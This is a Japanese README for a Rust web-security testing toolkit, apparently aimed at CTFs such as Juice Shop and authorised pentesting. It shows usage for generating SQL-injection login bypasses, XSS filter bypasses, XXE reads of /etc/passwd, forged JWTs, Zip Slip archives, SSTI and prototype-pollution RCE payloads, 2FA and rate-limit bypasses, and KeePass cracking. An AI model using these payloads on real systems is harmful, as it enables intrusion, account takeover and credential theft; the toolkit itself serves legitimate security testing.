# Web Security Toolkit

Rust製の汎用Webセキュリティテストツールキット。CTF、ペネトレーションテスト、セキュリティ診断に使用できます。

## インストール

```bash
cargo build --release
```

バイナリは `target/release/` に生成されます：
- `encoder` - エンコーディングツール
- `jwt-tool` - JWT操作ツール
- `payload-gen` - ペイロード生成ツール
- `ssrf-scanner` - SSRFスキャナー
- `zip-payload` - Zip Slipペイロード生成
- `web-scanner` - Webスキャナー
- `http-client` - HTTPクライアント
- `hashids-tool` - Hashidsエンコード/デコード
- `keepass-crack` - KeePassクラッカー
- `totp-tool` - TOTP/2FAユーティリティ
- `ssti-gen` - SSTIペイロード生成
- `svg-gen` - SVG攻撃ペイロード生成
- `bruteforce-gen` - ブルートフォースユーティリティ

## 使用シーン

### 1. ログイン認証のテスト (SQLi)

SQLインジェクションでログインをバイパスしたい場合：

```bash
# 認証バイパスペイロードを取得
payload-gen sqli auth-bypass

# 出力例:
# OR 1=1              → ' OR 1=1--
# Comment bypass      → admin'--
# Hash comment        → ' OR 1=1#

# 特定ユーザーでログインしたい場合
payload-gen sqli login jim@example.com
# 出力: jim@example.com'--
```

### 2. XSS脆弱性のテスト

入力フィールドでXSSを試したい場合：

```bash
# 基本的なXSSペイロード
payload-gen xss basic

# フィルタバイパスが必要な場合
payload-gen xss bypass

# 出力例:
# Double encoding     → <<script>script>alert('XSS')<</script>/script>
# Case mixing         → <ScRiPt>alert('XSS')</sCrIpT>
```

### 3. XXE攻撃のテスト

XMLアップロード機能がある場合：

```bash
# /etc/passwd を読み取るペイロード
payload-gen xxe file /etc/passwd

# 出力されるXMLをそのままアップロード
```

### 4. JWTトークンの改ざん

JWT認証をバイパスしたい場合：

```bash
# 現在のトークンをデコード
jwt-tool decode "eyJhbGciOiJIUzI1NiIs..."

# 署名なしJWTを生成（alg: none攻撃）
jwt-tool unsigned '{"data":{"email":"admin@example.com","role":"admin"}}'

# アルゴリズム混乱攻撃（RS256 → HS256）
jwt-tool hs256 '{"role":"admin"}' "公開鍵の内容"
```

### 5. IDOR（権限昇格）のテスト

他のユーザーのリソースにアクセスしたい場合：

```bash
# IDの変動パターンを生成
payload-gen idor ids 5 10
# 出力: 1, 2, 3, 4, 6, 7, 8, ... などのIDリスト

# よくあるIDORエンドポイント
payload-gen idor endpoints
```

### 6. パラメータ改ざんのテスト

APIリクエストを改ざんしたい場合：

```bash
# 負の値のテスト（料金計算などに有効）
payload-gen tampering negative quantity 1

# 出力例:
# Original: {"quantity":1}
# Tampered: {"quantity":-100}  ← 負の数量で返金を狙う

# Mass Assignment攻撃
payload-gen tampering mass-assignment

# 出力例:
# Original: {"email":"test@test.com"}
# Tampered: {"email":"test@test.com","role":"admin"}
```

### 7. セキュリティヘッダーの診断

Webサイトのセキュリティヘッダーをチェック：

```bash
# ヘッダーチェック（実際のサイトに対して実行）
web-scanner check-headers https://example.com

# 推奨ヘッダーを確認
web-scanner recommended-headers
```

### 8. Cookieのセキュリティチェック

```bash
web-scanner check-cookies https://example.com

# Secure, HttpOnly, SameSite属性をチェック
```

### 9. CORSの設定ミスを検出

```bash
web-scanner test-cors https://api.example.com --origin https://evil.com

# オリジン反射やワイルドカード設定を検出
```

### 10. パストラバーサル

ファイルアクセス制限をバイパスしたい場合：

```bash
# 様々なエンコードのペイロードを生成
payload-gen traversal 5 etc/passwd

# Null Byte攻撃を含むバリエーション
```

### 11. エンコーディング

```bash
# Juice Shopのクーポンコード生成（Z85エンコード）
encoder juice-coupon JAN 26 90
# Coupon: JAN26-90
# Z85: n<Michz3{y

# 各種エンコード
encoder encode base64 "secret"
encoder encode hex "data"
encoder decode z85 "encoded"
encoder rot13 "text"
```

### 12. Zip Slip攻撃

```bash
# カスタムZip Slipペイロード
zip-payload create -o exploit.zip -t "../../etc/passwd" -c "content"

# よくあるターゲットを確認
zip-payload list
```

### 13. Hashids / Continue Codes

Juice Shopの「続きから」機能などで使われるHashidsのエンコード/デコード：

```bash
# エンコード
hashids-tool encode 1,2,3 --salt "my secret"

# デコード
hashids-tool decode "abc123" --salt "my secret"

# 使用されているsaltを特定
hashids-tool discover "someHashid"

# Juice Shop用：Imaginary Challengeコード生成
hashids-tool juice-shop --imaginary

# Juice Shop用：Continue Codeのデコード
hashids-tool juice-shop --decode "yourContinueCode"

# 既知のsalt一覧
hashids-tool salts --all
```

### 14. KeePassクラッキング

KeePass KDBX (3.x) ファイルのパスワードクラッキング：

```bash
# ファイル情報の確認（Transform rounds等）
keepass-crack info database.kdbx

# 基本ワードリストでクラック
keepass-crack crack database.kdbx

# 拡張ワードリスト（より広範囲）
keepass-crack crack database.kdbx --extended

# カスタムワードリスト
keepass-crack crack database.kdbx --wordlist rockyou.txt

# キーファイルを併用
keepass-crack crack database.kdbx --keyfile image.jpg

# 単一パスワードを試行
keepass-crack crack database.kdbx --password "test123"

# 復号してXMLを取得
keepass-crack decrypt database.kdbx -p "password" -o decrypted.xml

# エントリ（クレデンシャル）を抽出
keepass-crack extract database.kdbx -p "password"
keepass-crack extract database.kdbx -p "password" --format json
keepass-crack extract database.kdbx -p "password" --format csv
```

### 15. SSTI (Server-Side Template Injection)

テンプレートエンジンの脆弱性を突くペイロード：

```bash
# ライブラリとして使用
```

```rust
use web_security_toolkit::ssti::*;

// 検出ペイロード
let payloads = detection_payloads();

// Jinja2/Python向け
let jinja = jinja2_payloads();

// Node.js向け (Pug, EJS, Nunjucks)
let nodejs = nodejs_payloads();

// Juice Shop向け
let juice = juice_shop_ssti();

// カスタムRCEペイロード生成
let rce = generate_rce_payload(TemplateEngine::Ejs, "id");
```

### 16. Prototype Pollution

JavaScript のプロトタイプ汚染攻撃：

```rust
use web_security_toolkit::prototype_pollution::*;

// 基本ペイロード
let payloads = basic_payloads();
// {"__proto__": {"admin": true}}

// Node.js RCE
let rce = nodejs_rce_payloads();

// DoS攻撃
let dos = dos_payloads();

// クエリストリング形式
let qs = query_string_payloads();
// __proto__[admin]=true
```

### 17. SVG攻撃

SVGファイルを使ったXSS、XXE、SSRF：

```rust
use web_security_toolkit::svg::*;

// SVG XSSペイロード
let xss = svg_xss_payloads();

// SVG XXE
let xxe = svg_xxe_payloads();

// SVG SSRF
let ssrf = svg_ssrf_payloads();

// カスタムSVG生成
let custom_xss = generate_svg_xss("alert(document.domain)");
let custom_ssrf = generate_svg_ssrf("http://internal:8080/admin");
let custom_xxe = generate_svg_xxe("/etc/passwd");
```

### 18. TOTP/2FA バイパス

2要素認証の突破と TOTP コード生成：

```rust
use web_security_toolkit::totp::*;

// TOTPコード生成
let code = generate_totp("JBSWY3DPEHPK3PXP", 0);

// タイムウィンドウ内のコード一覧
let codes = generate_totp_window("SECRET", 2);

// 2FAバイパス手法一覧
let bypasses = two_factor_bypasses();

// ブルートフォース用コード
let bf_codes = brute_force_codes();

// シークレット分析
let analysis = analyze_secret("JBSWY3DPEHPK3PXP");
```

### 19. ブルートフォースユーティリティ

PIN、パスワード、レート制限バイパス：

```rust
use web_security_toolkit::bruteforce::*;

// 数字シーケンス (4桁PIN)
let pins = numeric_sequence(4, 0, 9999);

// よくあるPINパターン
let common = common_pins();

// レート制限バイパス
let bypasses = rate_limit_bypasses();
// X-Forwarded-For, X-Real-IP, etc.

// IP ローテーション用アドレス生成
let ips = generate_ip_rotation(100);

// セキュリティ質問の回答候補
let pets = security_question_wordlist("pet");
// Zaya, Max, Buddy, ...
```

## ライブラリとしての使用

```rust
use web_security_toolkit::*;

// SQLiペイロード
let payloads = juice_shop_sqli();

// JWT生成
let token = create_unsigned_jwt(&json!({"role": "admin"}));

// セキュリティヘッダー分析
let checks = analyze_headers(&response_headers);

// IDOR ID生成
let ids = generate_id_variations(5, 10);

// パラメータ改ざん
let tests = negative_value_tests("quantity", 1);

// Hashids
let encoded = encode_hashid(&[1, 2, 3], "salt", 8);
let decoded = decode_hashid(&encoded, "salt");

// TOTP生成
let code = generate_totp("SECRET", 0);

// SSTI
let ssti = juice_shop_ssti();

// Prototype Pollution
let pp = pp_basic_payloads();

// SVG攻撃
let svg = generate_svg_xss("alert('XSS')");

// ブルートフォース
let pins = common_pins();
let bypasses = rate_limit_bypasses();
```

## テスト

```bash
cargo test
```

## 注意事項

- このツールは**許可されたシステム**に対してのみ使用してください
- CTF、ペネトレーションテスト、自社システムの診断に限定
- 不正アクセスは犯罪です
